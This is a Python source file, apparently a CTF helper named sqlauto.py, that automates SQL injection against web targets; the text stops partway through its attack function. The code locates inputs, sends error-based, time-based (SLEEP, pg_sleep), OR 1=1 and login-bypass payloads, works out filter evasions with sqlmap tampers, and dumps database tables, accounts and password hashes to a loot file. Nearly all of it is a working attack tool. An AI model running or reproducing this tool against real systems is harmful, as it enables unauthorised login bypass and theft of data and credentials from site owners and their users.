#!/usr/bin/env python3
"""
sqlauto.py - SQL injection helper for CTF / lab targets you are allowed to test.

  python3 sqlauto.py URL              find inputs -> quick payloads -> sqlmap with the right flags -> flags + tables
  python3 sqlauto.py URL --look       find the inputs, see what is filtered, print the sqlmap command - no dump
  python3 sqlauto.py URL --data 'user=a&pass=b'        POST form          (or --data '{"id":"1"}' for JSON)
  python3 sqlauto.py URL --cookie 'session=abc'        logged-in session / cookie to test
  python3 sqlauto.py URL --dbusers                     also pull DB accounts + password hashes (MySQL)

Steps (each prints what it sends, everything is saved under ./out_sql/):
  1 LOCATE  URL ?params, forms, links, fetch() JSON bodies; nothing found -> sweep common cookie/query/header names
  2 PROBE   add ' and "  -> SQL error or changed page = live input. Spots md5/sha signatures and base64 values
  3 QUICK   OR 1=1 family (hidden rows) and login-bypass payloads; flag-shaped text is shown at once
  4 SQLMAP  a yes/no test shows what is filtered (= < >, spaces, UNION/SELECT) -> sqlmap gets the matching flags.
            Data shows on the page / in errors: dump everything. Blind: flag-like tables first (--all for the rest)
  5 REPORT  every dumped table + anything flag-shaped -> screen and loot.txt

Slow or "429 Too Many Requests": add --delay 1.   Faster blind dumps on a server that copes: --threads 4.

Needs python3 (stdlib only) and sqlmap (on Kali already).
"""
import argparse, base64, binascii, csv, hashlib, html, http.cookiejar, json, os, re, shlex, ssl, subprocess, sys, threading, time
import urllib.error, urllib.parse, urllib.request
from concurrent.futures import ThreadPoolExecutor
from html.parser import HTMLParser
from urllib.parse import urljoin, urlsplit, urlunsplit, parse_qsl, quote

UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
CTX = ssl._create_unverified_context()          # CTF boxes use self-signed https
DELAY = 0.0
NREQ = 0
NLOCK = threading.Lock()                          # the name sweep sends 8 requests at a time
FINAL = ""                                        # URL of the last answer (after redirects)
COOKIES, HEADERS = {}, {}                         # sent with every request (session)
LOG = None

# ---------------------------------------------------------------- flag sniffing
FLAG_RES = [r"ehCTF\{[^}\n]{1,200}\}",
            r"\b[A-Za-z][A-Za-z0-9_]{1,15}\{[^{}\s:;]{3,150}\}",
            r"(?i)\bflag[\"']?\s*(?:is|=|:)\s*[\"']?[^\s<,'\"]{4,}"]
FOUND = {}                                        # flag -> where it was seen

def sniff(text, where, final=False):
    """Return flag-shaped strings in text (also inside base64 / hex blobs); remember where they came from."""
    hits, text = [], text or ""
    blobs = [("", text)]
    for tok in set(re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", text)):
        try: blobs.append((" (base64-decoded)", base64.b64decode(tok + "=" * (-len(tok) % 4)).decode("utf-8")))
        except Exception: pass
    for tok in set(re.findall(r"\b(?:[0-9a-fA-F]{2}){8,}\b", text)):
        try: blobs.append((" (hex-decoded)", binascii.unhexlify(tok).decode("utf-8")))
        except Exception: pass
    for note, blob in blobs:
        for rx in FLAG_RES:
            for m in re.finditer(rx, blob):
                f = m.group(0)
                if any(h in f for h in hits): continue                    # "flag: ehCTF{..}" repeats a hit we already have
                hits.append(f)
                if final or f not in FOUND: FOUND[f] = where + note
    return hits

def say(msg=""):
    print(msg, flush=True)
    if LOG: LOG.write(msg + "\n"); LOG.flush()

# ---------------------------------------------------------------- HTTP
def fetch(method, url, body=None, headers=None, jar=None, timeout=20):
    """One request. Follows redirects, keeps cookies in `jar`. Returns (status, text)."""
    global NREQ, FINAL
    if DELAY: time.sleep(DELAY)
    with NLOCK: NREQ += 1
    h = {"User-Agent": UA}; h.update(headers or {})
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                     urllib.request.HTTPCookieProcessor(jar if jar is not None else http.cookiejar.CookieJar()))
    for attempt in (1, 2):
        try:
            with op.open(req, timeout=timeout) as r:
                FINAL = r.geturl()
                return r.status, r.read(3_000_000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            if e.code == 429 and attempt == 1:
                say("    ! 429 Too Many Requests -> waiting 5 s (rerun with --delay 1 if this repeats)"); time.sleep(5); continue
            return e.code, e.read(3_000_000).decode("utf-8", "replace")
        except Exception:
            return 0, ""
    return 0, ""

class Cand:
    """One place where our text reaches the server."""
    def __init__(self, url, place, name, params, query=None, src="", login=False):
        self.url, self.place, self.name = url, place, name      # place: query | form | json | cookie | header
        self.params = dict(params)                               # every param in that place (incl. `name`), original order
        self.query = dict(query or {})                           # fixed ?params when place is not query
        self.src, self.login = src, login
        self.value = str(self.params.get(name, "1"))
        self.sign = None                                         # (param, algo): sibling param = hash(our value)
        self.b64 = False
        self.dbms = None; self.live = ""; self.base = ""
        self.risk3 = False; self.tampers = []; self.marker = None; self.diag = False   # set by diagnose(): what sqlmap needs first
    def key(self): return (self.url, self.place, self.name)
    def label(self):
        how = {"query": "GET ?%s", "form": "POST form %s", "json": "POST json %s", "cookie": "cookie %s", "header": "header %s"}[self.place] % self.name
        extra = (" [signed: %s=%s(%s)]" % (self.sign[0], self.sign[1], self.name) if self.sign else "") + (" [base64 value]" if self.b64 else "") + (" [login form]" if self.login else "")
        return "%s  %s%s" % (urlsplit(self.url).path or "/", how, extra)

def qs(d): return urllib.parse.urlencode(d, quote_via=quote)

def send(c, value, jar=None):
    """Put `value` into candidate c and send it."""
    v = base64.b64encode(value.encode()).decode() if c.b64 else value
    p = dict(c.params); p[c.name] = v
    if c.sign: p[c.sign[0]] = hashlib.new(c.sign[1], v.encode()).hexdigest()
    q, hdr, ck, body = dict(c.query), dict(HEADERS), dict(COOKIES), None
    if c.place == "query": q = p
    elif c.place == "form": body = qs(p); hdr["Content-Type"] = "application/x-www-form-urlencoded"
    elif c.place == "json": body = json.dumps(p); hdr["Content-Type"] = "application/json"
    elif c.place == "cookie": ck.update(p)
    elif c.place == "header": hdr.update(p)
    if ck: hdr["Cookie"] = "; ".join("%s=%s" % kv for kv in ck.items())
    url = c.url + ("?" + qs(q) if q else "")
    return fetch("POST" if body is not None else "GET", url, body.encode() if body is not None else None, hdr, jar)

# ---------------------------------------------------------------- page parsing
class Page(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms, self.links, self.scripts, self.srcs = [], [], [], []
        self._form = self._sel = None; self._js = None
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._form = {"action": a.get("action") or "", "method": (a.get("method") or "GET").upper(), "fields": {}, "login": False}
            self.forms.append(self._form)
        elif tag in ("input", "textarea", "select", "button") and self._form is not None and a.get("name"):
            typ = (a.get("type") or "text").lower(); name = a["name"]
            if typ == "password": self._form["login"] = True; val = "x"
            elif tag == "select": val = None; self._sel = name
            elif a.get("value"): val = a["value"]
            elif typ in ("checkbox", "radio"): val = "on"
            elif re.search(r"user|login|email|name", name, re.I) and tag == "input": val = "admin"
            else: val = "1"
            self._form["fields"].setdefault(name, val)
        elif tag == "option" and self._sel and self._form and self._form["fields"].get(self._sel) is None:
            self._form["fields"][self._sel] = a.get("value") or "1"
        elif tag == "a" and a.get("href"): self.links.append(a["href"])
        elif tag == "script":
            if a.get("src"): self.srcs.append(a["src"])
            self._js = []
    def handle_endtag(self, tag):
        if tag == "form": self._form = None
        elif tag == "select": self._sel = None
        elif tag == "script" and self._js is not None: self.scripts.append("".join(self._js)); self._js = None
    def handle_data(self, data):
        if self._js is not None: self._js.append(data)

def obj_keys(lit):
    """Keys of a simple JS object literal body:  id: String(id), qty   -> ['id', 'qty']"""
    keys = []
    for part in lit.split(","):
        m = re.match(r"\s*['\"]?([A-Za-z_]\w*)['\"]?\s*(?::|$)", part)
        if m: keys.append(m.group(1))
    return keys

def js_endpoints(js):
    """(path, 'json'|'form', [keys]) for fetch()/axios/$.post calls found in script text."""
    out = []
    for m in re.finditer(r"""fetch\(\s*['"`]([^'"`]+)['"`]\s*,(.{0,700})""", js, re.S):
        k = re.search(r"JSON\.stringify\(\s*\{([^}]*)\}", m.group(2))
        if k and obj_keys(k.group(1)): out.append((m.group(1), "json", obj_keys(k.group(1))))
    for m in re.finditer(r"""axios\.post\(\s*['"`]([^'"`]+)['"`]\s*,\s*\{([^}]*)\}""", js):
        if obj_keys(m.group(2)): out.append((m.group(1), "json", obj_keys(m.group(2))))
    for m in re.finditer(r"""\$\.post\(\s*['"`]([^'"`]+)['"`]\s*,\s*\{([^}]*)\}""", js):
        if obj_keys(m.group(2)): out.append((m.group(1), "form", obj_keys(m.group(2))))
    return out

HASHES = {32: ["md5"], 40: ["sha1"], 56: ["sha224"], 64: ["sha256"], 96: ["sha384"], 128: ["sha512"]}
def find_signature(params, name):
    """Sibling param whose value is an unsalted hash of params[name] -> (param, algo)."""
    for sp, sv in params.items():
        if sp == name or not re.fullmatch(r"[0-9a-fA-F]+", str(sv)): continue
        for algo in HASHES.get(len(sv), []):
            if hashlib.new(algo, str(params[name]).encode()).hexdigest() == sv.lower(): return (sp, algo)
    return None

def looks_b64(v):
    if not re.fullmatch(r"[A-Za-z0-9+/]{2,}={0,2}", v) or len(v) % 4 or v.isdigit(): return False
    try: d = base64.b64decode(v, validate=True).decode("ascii")
    except Exception: return False
    return bool(d) and d.isprintable() and (v.endswith("=") or len(v) >= 8)

def query_cands(url, src):
    sp = urlsplit(url); params = dict(parse_qsl(sp.query, keep_blank_values=True))
    base = urlunsplit((sp.scheme, sp.netloc, sp.path, "", "")); out = []
    for name in params:
        c = Cand(base, "query", name, params, src=src)
        c.sign = find_signature(params, name)
        if any(find_signature(params, o) and find_signature(params, o)[0] == name for o in params if o != name): continue   # never inject the signature itself
        c.b64 = looks_b64(c.value)
        if c.b64: c.value = base64.b64decode(c.value).decode()
        out.append(c)
    return out

def locate(url, body, args):
    """Every candidate input reachable from this page."""
    host = urlsplit(url).netloc; cands = query_cands(url, "URL")
    if args.data:                                                  # body given on the command line
        base = url.split("?")[0]; q = dict(parse_qsl(urlsplit(url).query))
        if args.data.lstrip().startswith("{"):
            try: p = {k: v for k, v in json.loads(args.data).items() if isinstance(v, (str, int, float))}
            except ValueError: sys.exit("    --data looks like JSON but does not parse: %s" % args.data)
            cands += [Cand(base, "json", k, p, q, "--data") for k in p]
        else:
            p = dict(parse_qsl(args.data, keep_blank_values=True))
            login = any(re.search(r"pass|pwd", k, re.I) for k in p)
            cands += [Cand(base, "form", k, p, q, "--data", login) for k in (list(p)[:1] if login else p)]
    pg = Page()
    try: pg.feed(body)
    except Exception: pass
    for f in pg.forms:
        act = urljoin(url, f["action"]) if f["action"] else url
        if urlsplit(act).netloc != host or not f["fields"]: continue
        fields = {k: ("1" if v is None else v) for k, v in f["fields"].items()}
        asp = urlsplit(act); abase = urlunsplit((asp.scheme, asp.netloc, asp.path, "", "")); aq = dict(parse_qsl(asp.query))
        names = [next((k for k in fields if re.search(r"user|login|email|name", k, re.I)), list(fields)[0])] if f["login"] else list(fields)
        for name in names:                                         # login form: one entry, every field gets tested together
            if f["method"] == "POST": cands.append(Cand(abase, "form", name, fields, aq, "form on page", f["login"]))
            else: cands.append(Cand(abase, "query", name, {**aq, **fields}, src="form on page", login=f["login"]))
    for href in pg.links:
        u = urljoin(url, href)
        if u.startswith("http") and urlsplit(u).netloc == host and urlsplit(u).query: cands += query_cands(u, "link on page")
    js = list(pg.scripts)
    for src in pg.srcs[:6]:                                        # same-site script files
        su = urljoin(url, src)
        if urlsplit(su).netloc == host: js.append(fetch("GET", su, headers=session_headers())[1])
    for path, kind, keys in js_endpoints("\n".join(js)):
        eu = urljoin(url, path)
        if urlsplit(eu).netloc == host:
            cands += [Cand(eu.split("?")[0], kind, k, {x: "1" for x in keys}, src="script on page") for k in keys]
    if not any(c.place == "json" for c in cands) and re.search(r"JSON\.stringify|application/json", "\n".join(js)):
        say("    note: page script builds a JSON request I could not read -> DevTools > Network > copy the body, rerun with --data '{...}'")
    seen, out = set(), []
    for c in cands:
        if c.key() not in seen: seen.add(c.key()); out.append(c)
    return out, pg

def session_headers():
    h = dict(HEADERS)
    if COOKIES: h["Cookie"] = "; ".join("%s=%s" % kv for kv in COOKIES.items())
    return h

# ---------------------------------------------------------------- probing
SQLERR = re.compile(r"SQL error|SQL syntax|syntax error|unrecognized token|unterminated|sqlite3?[.:]|SQLSTATE|mysqli?_|mysql_fetch|"
                    r"You have an error in your SQL|ORA-\d{4,5}|pg_query|psycopg|ODBC|OperationalError|ProgrammingError|"
                    r"no such (?:table|column)|incomplete input|Unclosed quotation|quoted string not properly terminated|"
                    r"Warning: .{0,60}(?:mysql|sqlite|pg_|PDO)|Fatal error: .{0,80}(?:PDO|mysqli|SQLite)|Traceback \(most recent call last\)", re.I)
DBMS_HINTS = [("MySQL", r"MySQL|MariaDB|mysqli?_|You have an error in your SQL"),
              ("SQLite", r"sqlite|unrecognized token|incomplete input|no such (?:table|column)"),
              ("PostgreSQL", r"PostgreSQL|pg_query|psycopg|unterminated quoted"),
              ("Microsoft SQL Server", r"SQL Server|Unclosed quotation"), ("Oracle", r"ORA-\d{4,5}")]

def norm(text, *sent):
    """Page text without our own echoed input, so two pages compare by what the DB answered.
    Comparing two pages: give both calls the same payloads (a short one like "1" also removes that digit everywhere)."""
    text = re.sub(r"""value\s*=\s*(["']).*?\1""", "value=", text or "", flags=re.I | re.S)
    for v in sorted({f(x) for x in sent for f in (str, html.escape, lambda y: html.escape(y, quote=False), quote, urllib.parse.quote_plus)}, key=len, reverse=True):
        if v: text = text.replace(v, "")
    return re.sub(r"\s+", " ", text).strip()

def lines(text):
    """Visible text lines of an HTML (or JSON) answer."""
    text = re.sub(r"(?is)<(script|style)\b.*?</\1>", " ", text or "")
    text = re.sub(r"(?i)<br\s*/?>|</(p|div|li|tr|h\d|td|th|pre)>", "\n", text)
    return [l for l in (re.sub(r"\s+", " ", html.unescape(re.sub(r"<[^>]+>", " ", x))).strip() for x in text.split("\n")) if l]

def new_lines(text, base):
    old = set(lines(base)); return [l for l in lines(text) if l not in old]

def probe(c):
    """Is this input live?  Sets c.live ('' = dead), c.base, c.dbms."""
    s0, b0 = send(c, c.value); c.base = b0
    for qch in ("'", '"'):
        s, b = send(c, c.value + qch)
        if SQLERR.search(b) and not SQLERR.search(b0):
            c.live = "SQL error on %s" % qch
            c.dbms = next((n for n, rx in DBMS_HINTS if re.search(rx, "\n".join(new_lines(b, b0)), re.I)), None)
            return c.live
        if not c.live and (s != s0 or norm(b, c.value + qch, c.value) != norm(b0, c.value + qch, c.value)):
            c.live = "page changes on %s" % qch
    if c.live and norm(send(c, c.value)[1], c.value) != norm(b0, c.value):      # same request twice, two different pages
        c.live = "" if c.src == "sweep" else "page changes by itself -> sqlmap decides"
    if not c.live and c.login: c.live = "login form (errors hidden)"
    return c.live

def timeprobe(c):
    """Page never changes? See if a sleep payload makes the answer late (MySQL / PostgreSQL)."""
    t0 = time.time(); send(c, c.value); normal = time.time() - t0
    for p in ("{v} AND SLEEP(3)", "{v}' AND SLEEP(3)-- -", "{v}' AND (SELECT 1 FROM pg_sleep(3)) IS NOT NULL-- -", "{v}; SELECT pg_sleep(3)-- -"):
        t0 = time.time(); send(c, p.format(v=c.value))
        if time.time() - t0 > normal + 2.5:
            c.live = "answers 3 s late on %s" % p.format(v=c.value); return c.live
    return ""

def marker(yes, no):
    """Short text that only the TRUE page has -> ('--string', text); else only the FALSE page -> ('--not-string', text)."""
    for flag, a, b in (("--string", yes, no), ("--not-string", no, yes)):
        other, best = set(lines(b)), ""
        for l in lines(a):
            if l in other: continue
            w = l.split(" ")
            for i in range(len(w)):
                for j in range(len(w), i, -1):
                    ws = w[i:j]
                    while ws and re.fullmatch(r"[\d.,]+", ws[0]): ws = ws[1:]            # counts change -> keep the words only
                    while ws and re.fullmatch(r"[\d.,]+", ws[-1]): ws = ws[:-1]
                    cand = " ".join(ws)
                    if len(best) < len(cand) <= 60 and cand in a and cand not in b: best = cand
        if len(best) >= 4: return flag, best
    return None

def diagnose(c):
    """Find a yes/no payload shape, then check what the app strips. Result = which sqlmap flags to try first."""
    raw = {}
    def ask(pre, suf, word, cond, sp):
        suf2 = suf if sp == " " else suf.replace("-- -", "--")
        p = ("%s%s %s %s" % (c.value, pre, word, cond)).replace(" ", sp) + ((" " if sp == " " else "") + suf2 if suf2 else "")
        s, b = send(c, p); raw[cond] = b
        return None if SQLERR.search(b) or s >= 500 else norm(b, p)
    shapes = [(pre, suf, w) for w in ("AND", "OR") for pre, suf in (("", ""), ("'", "-- -"), ("'", "#"), ('"', "-- -"), ("')", "-- -"))]
    for sp in (" ", "/**/"):
        for pre, suf, w in shapes:
            t, f = ask(pre, suf, w, "1 LIKE 1", sp), ask(pre, suf, w, "1 LIKE 2", sp)
            if t is None or f is None or t == f or ask(pre, suf, w, "2 LIKE 2", sp) != t: continue
            notes = []; q = lambda cond: ask(pre, suf, w, cond, sp)
            if sp != " ": c.tampers.append("space2comment"); notes.append("spaces stripped -> /**/ instead")
            if q("1=1") != t or q("1=2") != f: c.tampers.append("between,equaltolike"); notes.append("= stripped -> LIKE / BETWEEN instead")
            if q("length('abcdef') LIKE 6") == t:                     # quotes usable -> can test keyword filters
                gone = [k for k in ("SELECT", "UNION") if q("length('%s') LIKE %d" % (k, len(k))) != t]
                if gone and all(q("length('%s') LIKE %d" % (k[0] + k[1:].lower().swapcase()[0] + k[2:].lower(), len(k))) == t for k in gone):
                    c.tampers.append("randomcase"); notes.append("%s blocked in one case only -> mixed case" % "/".join(gone))
                elif gone: c.tampers.append("nestkw"); notes.append("%s deleted -> nest them (SELselectECT)" % "/".join(gone))
            c.risk3 = w == "OR"; c.marker = marker(raw["1 LIKE 1"], raw["1 LIKE 2"]); c.diag = True
            say("    yes/no works:  %s%s %s 1 LIKE 1 %s   (%s)" % (c.value, pre, w, suf, "; ".join(notes) or "no filter seen"))
            if c.marker: say("    TRUE page %s: %r" % ("has" if c.marker[0] == "--string" else "lacks", c.marker[1]))
            return True
    say("    no simple yes/no payload found -> sqlmap tries its own")
    return False

SWEEP = ("id uid user userid user_id username member memberid member_id account accountid acct customer customerid custid "
         "sid session token auth q query search s item cart product pid cat category name email page num no ref key code order").split()
SWEEP_HEADERS = ["X-Forwarded-For", "User-Agent", "Referer", "X-Real-IP", "X-Client-IP", "X-User-Id"]

def sweep(url):
    """No visible input: try common names as query param / cookie / header and keep those that change the page."""
    base = url.split("?")[0]; b0 = fetch("GET", base, headers=session_headers())[1]
    calm = norm(fetch("GET", base, headers=session_headers())[1]) == norm(b0)   # False: page changes by itself -> only an SQL error counts
    say("    nothing visible -> sweeping %d names as query param and cookie, %d headers%s" % (len(SWEEP), len(SWEEP_HEADERS), "" if calm else "  (page changes by itself: only an SQL error counts)"))
    def one(pn):
        for val in ("1'", "1"):
            c = Cand(base, pn[0], pn[1], {pn[1]: val}, src="sweep")
            b = send(c, val)[1]
            if (SQLERR.search(b) and not SQLERR.search(b0)) or (calm and abs(len(norm(b, val)) - len(norm(b0, val))) > 5):
                c.params[pn[1]] = c.value = "1"; return c
    todo = [(place, n) for place, names in (("query", SWEEP), ("cookie", SWEEP), ("header", SWEEP_HEADERS)) for n in names]
    ex = ThreadPoolExecutor(1 if DELAY else 8)                         # 8 at a time; --delay = one at a time
    try: return [c for c in ex.map(one, todo) if c]
    finally: ex.shutdown(wait=False, cancel_futures=True)              # Ctrl-C: drop what has not started

# ---------------------------------------------------------------- quick wins
QUICK = ["{v} OR 1=1", "{v} OR 1=1-- -", "{v}' OR '1'='1", "{v}' OR 1=1-- -", "{v}' OR 1=1#", '{v}" OR 1=1-- -',
         "{v}') OR 1=1-- -", "{v} OR 1", "{v}' OR 1-- -"]
BYPASS = ["admin' -- -", "admin'#", "' OR 1=1-- -", "' OR '1'='1", "' OR 1=1#", 'admin" -- -', '" OR 1=1-- -',
          "') OR 1=1-- -", "' OR 1=1 LIMIT 1-- -", "admin') -- -"]

def show_new(text, base, where, limit=10):
    new = new_lines(text, base); flags = sniff("\n".join(new), where)
    for l in new[:limit]: say("        | " + l[:170])
    if len(new) > limit: say("        | ... %d more lines (see run.log)" % (len(new) - limit))
    if LOG and len(new) > limit: LOG.write("\n".join(new[limit:]) + "\n")
    for f in flags: say("        >>> FLAG-SHAPED: %s" % f)
    return new

def quick(c):
    """OR 1=1 family: shows rows the page normally hides."""
    seen = set()
    say("    %d always-true payloads; only answers that show MORE than the normal page are listed" % len(QUICK))
    for tpl in QUICK:
        p = tpl.format(v=c.value); s, b = send(c, p)
        new = new_lines(b, c.base)
        grew = len(lines(b)) > len(lines(c.base)) or sniff("\n".join(new), "page after payload %r on %s" % (p, c.label()))
        if SQLERR.search(b) or not new or not grew or tuple(new) in seen: continue
        seen.add(tuple(new))
        say("    payload  %s   -> page shows %d new line(s):" % (p, len(new)))
        show_new(b, c.base, "page after payload %r on %s" % (p, c.label()))

def bypass(c):
    """Login form: classic bypass strings in every text field; success = page differs from a failed login."""
    fields = [k for k in c.params]
    def login(val):
        jar = http.cookiejar.CookieJar(); old = dict(c.params)
        for k in fields:
            if not re.search(r"submit|csrf|token|btn", k, re.I): c.params[k] = val
        r = send(c, val, jar); c.params = old
        return r[0], r[1], jar
    s0, fail, _ = login("zz9invalid"); done = set()
    for p in BYPASS:
        s, b, jar = login(p)
        new = new_lines(b, fail)
        if s >= 500 or SQLERR.search(b) or norm(b, p) == norm(fail, "zz9invalid") or tuple(new) in done: continue
        done.add(tuple(new))
        say("    LOGIN BYPASS  %s  (same text in every field) -> page after login:" % p)
        show_new(b, fail, "page after login bypass %r on %s" % (p, c.label()))
        if len(jar): say("        session cookie: " + "; ".join("%s=%s" % (k.name, k.value) for k in jar))
        if len(done) >= 2: break
    if not done: say("    no bypass string changed the login answer")

# ---------------------------------------------------------------- sqlmap
NESTKW = '''import re
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL
def dependencies(): pass
def tamper(payload, **kwargs):
    # UNION -> UNIunionON, SELECT -> SELselectECT : survives a filter that deletes the word once
    return re.sub(r"(?i)\\b(union|select)\\b", lambda m: m.group(1)[:3] + m.group(1).lower() + m.group(1)[3:], payload) if payload else payload
'''
KEEP = re.compile(r"appears to be '|identified the following|^Parameter:|^\s+Type:|^back-end DBMS|retrieved:|CRITICAL|ERROR\]|"
                  r"not injectable|does not seem|password hash|cracked password|database management system users|^\[\*\] |"
                  r"\(429\)|Too Many Requests|rate.?limit", re.I)
ONCE = re.compile(r"^Parameter:|^\s+Type:|^back-end DBMS")                              # shown for the first run of an input only

NOISE = re.compile(r"retrieved:\s*$|retrieved: [_.]+\s*$|retrieved: .*\s{3,}$|starting @|ending @|shutting down|current status")   # repaints, banners

def sqlmap_cmd(c, extra, outdir, args):
    p = dict(c.params)
    if c.b64: p[c.name] = base64.b64encode(c.value.encode()).decode()
    q = p if c.place == "query" else c.query
    cmd = ["sqlmap", "-u", c.url + ("?" + qs(q) if q else "")]
    hdrs = ["%s: %s" % kv for kv in HEADERS.items()]; ck = dict(COOKIES)
    if c.place == "query": cmd += ["-p", c.name]
    elif c.place == "form": cmd += ["--data", qs(p)] + ([] if c.login else ["-p", c.name])
    elif c.place == "json": cmd += ["--data", json.dumps(p), "-p", c.name]; hdrs.append("Content-Type: application/json")
    elif c.place == "cookie": ck.update({k: (v + "*" if k == c.name else v) for k, v in p.items()})
    elif c.place == "header": hdrs += ["%s: %s*" % (k, v) for k, v in p.items()]
    if ck: cmd += ["--cookie", "; ".join("%s=%s" % kv for kv in ck.items())]
    if hdrs: cmd += ["--headers", "\n".join(hdrs)]
    if c.sign and c.sign[0].isidentifier() and c.name.isidentifier():
        cmd += ["--eval", "import hashlib; %s=hashlib.%s(%s.encode()).hexdigest()" % (c.sign[0], c.sign[1], c.name)]
    if c.b64: cmd += ["--base64=" + c.name]
    cmd += ["--delay=%g" % DELAY] if DELAY else ["--threads=%d" % args.threads]
    cmd += extra + ["--batch", "--random-agent", "--disable-coloring", "--flush-session", "--output-dir=" + outdir]
    return cmd

def shown(cmd):
    """The command as text you can paste and edit (output-folder plumbing left out)."""
    keep = [x for x in cmd if x not in ("--disable-coloring", "--flush-session") and not x.startswith("--output-dir=")]
    return ("SQLMAP_UNSAFE_EVAL=1 " if "--eval" in cmd else "") + shlex.join(keep)

def run(cmd, logfile, args, first=True):
    """Run sqlmap, show the useful lines live. Returns (output, stopped_by_ctrl_c)."""
    env = dict(os.environ, SQLMAP_UNSAFE_EVAL="1"); out = []; t0 = time.time(); stopped = False
    try: p = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, errors="replace", env=env)
    except FileNotFoundError: sys.exit("      sqlmap not found -> sudo apt install sqlmap   (or use sqli/sqli_guide.py, which needs no sqlmap)")
    try:
        for line in p.stdout:
            line = line.rstrip("\n"); out.append(line)
            if args.verbose or (KEEP.search(line) and not NOISE.search(line) and (first or not ONCE.search(line))): say("      " + re.sub(r"^\[\d\d:\d\d:\d\d\] ", "", line)[:150])
            sniff(line, "sqlmap output")
            if time.time() - t0 > args.max_time:
                say("      ! %d s limit (--max-time) -> stopping this run" % args.max_time); p.terminate(); break
    except KeyboardInterrupt:
        stopped = True; say("      ! Ctrl-C -> stopping this input, keeping what was dumped")
    try: p.wait(timeout=10)
    except (Exception, KeyboardInterrupt): p.kill()
    open(logfile, "w").write("\n".join(out) + "\n")
    return "\n".join(out), stopped

def read_dump(outdir):
    """sqlmap CSV dumps -> [(db, table, header, rows)]"""
    tables = []
    for root, _, files in os.walk(outdir):
        if os.path.basename(os.path.dirname(root)) != "dump": continue
        for f in sorted(files):
            if not f.endswith(".csv"): continue
            rows = list(csv.reader(open(os.path.join(root, f), newline="", errors="replace")))
            if len(rows) > 1: tables.append((os.path.basename(root), f[:-4], rows[0], rows[1:]))
    return tables

def report(tables, c, loot):
    for db, tb, head, rows in tables:
        say("    TABLE %s.%s  (%d row%s)   columns: %s" % (db, tb, len(rows), "" if len(rows) == 1 else "s", ", ".join(head)))
        loot.write("\n# %s.%s   via %s\n%s\n" % (db, tb, c.label(), " | ".join(head)))
        for i, r in enumerate(rows):
            loot.write(" | ".join(r) + "\n")
            if i < 12: say("        " + " | ".join(x[:70] for x in r))
        if len(rows) > 12: say("        ... %d more rows in loot.txt" % (len(rows) - 12))
        for f in sniff("\n".join(" ".join(r) for r in rows), "table %s.%s (%s)" % (db, tb, c.label()), final=True): say("        >>> FLAG-SHAPED: %s" % f)
    loot.flush()

FAST = ["--technique=BEU"]            # boolean, error, union. Time-based tests add ~10 s per run -> last resort only

def ladder(c, tamdir):
    """sqlmap variants to try, most likely first (diagnosis), then generic fallbacks."""
    if c.live.startswith("answers"): return [("time-based only", ["--technique=T", "--time-sec=3"])]
    base = ["--risk=3", "--level=2"] if (c.login or c.risk3) else []
    tam = lambda names: ["--tamper=" + ",".join(os.path.join(tamdir, "nestkw.py") if x == "nestkw" else x for x in names)]
    mark = list(c.marker) if c.marker else []
    rungs = [("as diagnosed" if (c.tampers or base or mark) else "plain", FAST + base + (tam(c.tampers) if c.tampers else []) + mark)]
    more = [("plain", FAST), ("with OR payloads", FAST + ["--risk=3", "--level=2"])]
    if c.place in ("cookie", "header"): more.append(("value sent raw (not URL-encoded)", FAST + base + ["--skip-urlencode"]))
    more += [("= < > stripped", FAST + base + tam(["between,equaltolike"])), ("spaces stripped", FAST + base + tam(["space2comment"]))]
    if c.live.startswith("SQL error") or c.login:
        more += [("UNION / SELECT deleted once", FAST + base + tam(["nestkw"])), ("keyword blacklist, one case only", FAST + base + tam(["randomcase"]))]
    more.append(("all techniques incl. time-based, deeper tests", ["--level=3", "--risk=3"]))
    if not (c.diag or c.login or c.live.startswith("SQL error")): more = more[:2]      # weak sign only -> do not spend minutes on it
    for why, extra in more:
        if all(extra != r[1] for r in rungs): rungs.append((why, extra))
    return rungs

PRI = [re.compile(r"flag|secret|ctf|key|token|vault|hidden|private", re.I),            # blind dumps go in this order
       re.compile(r"admin|user|account|member|cred|pass|login|note", re.I), re.compile("")]

def parse_tables(text):
    """sqlmap --tables output -> {database: [tables]}   ('' = the only database, e.g. SQLite)"""
    dbs, db, ls = {}, None, text.split("\n")
    for i, l in enumerate(ls):
        if re.match(r"\[\d+ tables?\]", l.strip()):
            prev = ls[i - 1].strip(); db = prev[10:] if prev.startswith("Database: ") else ""; dbs[db] = []
        elif db is not None and l.startswith("| "): dbs[db].append(l.strip("| ").strip())
        elif db is not None and not l.startswith("+"): db = None
    return dbs

def attack(c, n, out, args, loot):
    """sqlmap, one variant at a time until table names come back. Fast channel: dump all. Blind: flag-like tables first."""
    tamdir = os.path.join(out, "tamper")
    cmds = open(os.path.join(out, "commands.txt"), "a"); shown_tables = set()
    for i, (why, extra) in enumerate(ladder(c, tamdir), 1):
        od = os.path.join(out, "sqlmap_%d_%d_%s" % (n, i, time.strftime("%H%M%S")))      # fresh folder: no stale dumps
        def go(more, tag, fresh=False):
            cmd = [x for x in sqlmap_cmd(c, extra + more, od, args) if fresh or x != "--flush-session"]
            say("      $ %s" % shown(cmd)); cmds.write(shown(cmd) + "\n"); cmds.flush()
            text, stopped = run(cmd, os.path.join(out, "sqlmap_%d_%d_%s.log" % (n, i, tag)), args, fresh)
            new = [t for t in read_dump(od) if (t[0], t[1]) not in shown_tables]
            shown_tables.update((t[0], t[1]) for t in new); report(new, c, loot)
            return text, stopped
        say("    try %d: %s" % (i, why))
        text, stopped = go(["--tables", "--exclude-sysdbs"], "tables", fresh=True)
        dbs = {d: t for d, t in parse_tables(text).items() if t}; types = re.findall(r"^\s+Type: (.+)$", text, re.M)
        if stopped: return True
        if not dbs:
            if "identified the following injection" in text: say("      injectable, but no table names came back -> next variant")
            continue
        say("      tables: " + "; ".join("%s%s" % (d + ": " if d else "", ", ".join(t)) for d, t in dbs.items()))
        if args.all or any(t.startswith(("UNION", "error", "inline")) for t in types):
